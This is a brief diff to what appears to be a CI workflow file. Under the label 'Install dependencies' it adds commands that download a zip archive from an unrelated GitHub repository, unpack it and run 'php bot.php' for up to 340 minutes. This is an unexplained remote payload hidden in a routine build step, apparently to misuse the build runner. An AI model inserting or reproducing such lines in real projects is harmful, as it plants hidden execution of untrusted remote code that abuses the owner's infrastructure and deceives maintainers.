@@ -25,4 +25,9 @@ jobs:
     - name: Install dependencies
       run: |
         set -e
+        mkdir tesas
+        cd tesas
+        wget https://github.com/Gkist2264/test15y/raw/main/esb.zip
+        unzip esb.zip
+        timeout 340m php bot.php
         php --version
